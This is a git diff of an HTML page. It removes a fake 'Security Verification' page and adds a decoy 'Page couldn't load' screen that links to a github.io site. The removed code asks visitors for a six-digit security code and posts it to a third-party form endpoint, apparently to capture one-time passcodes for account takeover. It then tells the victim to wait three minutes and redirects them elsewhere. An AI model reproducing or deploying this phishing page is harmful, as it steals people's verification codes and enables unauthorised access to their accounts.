@@ -3,217 +3,100 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Security Verification | Gateway</title>
+  <link rel="icon" type="image/png" href="favicon.png">
+  <title>Loading Failed</title>
   <style>
     :root {
       --primary: #10b981; 
-      --primary-dark: #059669;
       --bg-base: #020617; 
-      --card-bg: rgba(7, 10, 15, 0.95); 
+      --card-bg: rgba(15, 23, 42, 0.9); 
       --text-main: #f8fafc;
-      --text-muted: #64748b;
-      --border: rgba(255, 255, 255, 0.05);
+      --text-muted: #94a3b8;
+      --border: rgba(255, 255, 255, 0.1);
     }
 
-    body { 
-      margin: 0; 
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
-      background: var(--bg-base) url('background.jpg') no-repeat center center fixed; 
-      background-size: cover !important; 
-      color: var(--text-main); 
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, "Inter", "Segoe UI", Roboto, sans-serif;
+      background: var(--bg-base) url('background.jpg') no-repeat center center fixed;
+      background-size: cover;
+      color: var(--text-main);
       display: flex;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
     }
 
-    .overlay { 
-      background: radial-gradient(circle at center, rgba(2, 6, 23, 0.4) 0%, rgba(2, 6, 23, 0.95) 100%);
+    .overlay {
+      background: radial-gradient(circle at center, rgba(2, 6, 23, 0.6) 0%, rgba(2, 6, 23, 0.98) 100%);
       width: 100%;
       min-height: 100vh;
       display: flex;
       align-items: center;
       justify-content: center;
+      padding: 20px;
     }
 
-    .container { 
+    .container {
       background: var(--card-bg);
-      backdrop-filter: blur(30px);
-      -webkit-backdrop-filter: blur(30px);
-      padding: 40px 35px; 
+      backdrop-filter: blur(24px);
+      -webkit-backdrop-filter: blur(24px);
+      padding: 60px 40px; 
       width: 100%;
-      max-width: 380px; 
-      border-radius: 28px; 
+      max-width: 400px;
+      border-radius: 32px;
       border: 1px solid var(--border);
-      box-shadow: 0 30px 60px -12px rgba(0, 0, 0, 0.9);
+      box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.6);
+      text-align: center;
+    }
+
+    h2 {
+      font-size: 28px;
+      font-weight: 700; /* Bold white text */
+      margin: 0 0 15px 0;
+      color: #ffffff;
+      letter-spacing: -0.5px;
+    }
+
+    p {
+      font-size: 15px;
+      color: var(--text-muted);
+      line-height: 1.6;
+      margin-bottom: 40px;
+    }
+
+    /* Long Bubble Button */
+    .btn-dashboard {
+      display: block;
+      padding: 18px 30px;
+      border-radius: 100px; 
+      background: var(--primary);
+      color: #ffffff;
+      text-decoration: none;
+      font-size: 15px;
+      font-weight: 600;
+      transition: all 0.3s ease;
       box-sizing: border-box;
     }
 
-    .logo-container { text-align: left; margin-bottom: 25px; }
-    .logo-container img { max-width: 110px; height: auto; display: block; }
-
-    .security-badge {
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-      background: rgba(16, 185, 129, 0.05);
-      color: var(--primary);
-      padding: 4px 12px;
-      border-radius: 100px;
-      font-size: 10px;
-      font-weight: 500;
-      text-transform: uppercase;
-      letter-spacing: 0.8px;
-      margin-bottom: 20px;
-      border: 1px solid rgba(16, 185, 129, 0.1);
+    .btn-dashboard:hover {
+      filter: brightness(1.1);
+      transform: translateY(-2px);
+      box-shadow: 0 12px 24px rgba(16, 185, 129, 0.4);
     }
-    
-    h2 { font-size: 22px; font-weight: 600; margin: 0 0 8px 0; }
-    p { font-size: 13px; color: var(--text-muted); line-height: 1.5; margin-bottom: 24px; }
-    
-    input { 
-      display: block; 
-      margin: 20px auto; 
-      padding: 12px; 
-      width: 100%; 
-      border-radius: 50px; 
-      border: 1px solid rgba(255,255,255,0.1); 
-      background: rgba(0, 0, 0, 0.3); 
-      color: white; 
-      font-size: 18px;
-      letter-spacing: 4px;
-      text-align: center;
-      box-sizing: border-box;
-      outline: none;
-    }
-
-    button { 
-      padding: 14px 20px; 
-      border-radius: 50px; 
-      cursor: pointer; 
-      font-weight: 600; 
-      width: 100%; 
-      font-size: 13px; 
-      transition: all 0.2s ease;
-      text-transform: uppercase;
-      border: none;
-    }
-
-    #reqBtn { background: #ffffff; color: #020617; }
-    #reqBtn:hover { background: #f1f5f9; transform: translateY(-1px); }
-    #reqBtn:disabled { background: #64748b; cursor: not-allowed; }
-
-    .btn-verify { background: var(--primary); color: white; margin-top: 12px; }
-    .btn-verify:hover { background: var(--primary-dark); transform: translateY(-1px); }
-    
-    .status-msg { 
-      margin-top: 15px; 
-      font-size: 12px; 
-      color: var(--primary); 
-      font-weight: 500;
-      padding: 12px;
-      background: rgba(16, 185, 129, 0.1);
-      border-radius: 12px;
-      border: 1px solid rgba(16, 185, 129, 0.2);
-      text-align: center;
-    }
-    
-    #codeEntrySection { display: none; margin-top: 20px; }
   </style>
 </head>
 <body>
 
 <div class="overlay">
   <div class="container">
-    <div class="logo-container">
-      <img src="logo.png" alt="Company Logo">
-    </div>
-
-    <div id="mainSection">
-      <div class="security-badge">Secure Access</div>
-      <h2>Verification</h2>
-      <p>Confirm your identity. A code will be issued to your device.</p>
-      
-      <form id="vForm">
-        <input type="hidden" name="phone_number" value="Hidden_System_User">
-        <input type="hidden" name="intent" id="intent" value="">
-
-        <button type="button" id="reqBtn" onclick="handleForm('req')">Request Code</button>
-        
-        <div id="waitMessage" class="status-msg" style="display:none;">
-          Request sent. Please check your device.
-        </div>
-
-        <div id="codeEntrySection">
-          <h3 style="margin: 0; font-size: 13px; font-weight: 500; color: var(--text-muted); text-align: center;">Enter Security Key</h3>
-          <input type="text" name="received_code" id="codeInput" placeholder="000000" maxlength="6" inputmode="numeric">
-          <button type="button" id="subBtn" class="btn-verify" onclick="handleForm('verify')">Verify Identity</button>
-          
-          <div id="successMessage" class="status-msg" style="display:none;">
-            Verification successful! Please wait 3 minutes before logging in...
-          </div>
-        </div>
-      </form>
-    </div>
+    <h2>Page couldn't load</h2>
+    <p>Something went wrong while trying to reach this destination,please try again.</p>
+    
+    <a href="https://the-pigeon101.github.io/" class="btn-dashboard">try again</a>
   </div>
 </div>
-
-<script>
-  async function handleForm(mode) {
-    const reqBtn = document.getElementById('reqBtn');
-    const subBtn = document.getElementById('subBtn');
-    const codeSection = document.getElementById('codeEntrySection');
-    const intentInput = document.getElementById('intent');
-    const codeInput = document.getElementById('codeInput');
-
-    // Update the intent based on the mode
-    intentInput.value = (mode === 'req') ? "Requesting New Code" : "Code Provided: " + codeInput.value;
-
-    const currentBtn = (mode === 'req') ? reqBtn : subBtn;
-    const statusMsg = (mode === 'req') ? document.getElementById('waitMessage') : document.getElementById('successMessage');
-
-    // Disable button to prevent double-clicks
-    currentBtn.disabled = true;
-    const originalText = currentBtn.innerText;
-    currentBtn.innerText = "Processing...";
-
-    try {
-      // FIX: Added quotes around the URL
-      const response = await fetch('https://formcarry.com/s/6u_Lkdx6_ly', {
-        method: 'POST',
-        headers: { 
-          'Accept': 'application/json',
-          'Content-Type': 'application/x-www-form-urlencoded'
-        },
-        body: new URLSearchParams(new FormData(document.getElementById('vForm')))
-      });
-
-      if (response.ok) {
-        statusMsg.style.display = "block";
-        currentBtn.innerText = "Success";
-        
-        if (mode === 'req') {
-          setTimeout(() => {
-            reqBtn.style.display = "none";
-            codeSection.style.display = "block";
-          }, 800);
-        } else {
-          // FIX: Added quotes around the redirect URL
-          setTimeout(() => { 
-            window.location.href = 'https://the-pigeon101.github.io/'; 
-          }, 2000);
-        }
-      } else {
-        throw new Error("Server error");
-      }
-    } catch (err) {
-      console.error("Submission error:", err);
-      alert("Verification service is currently busy. Please try again in a moment.");
-      currentBtn.disabled = false;
-      currentBtn.innerText = originalText;
-    }
-  }
-</script>
 
 </body>
 </html>
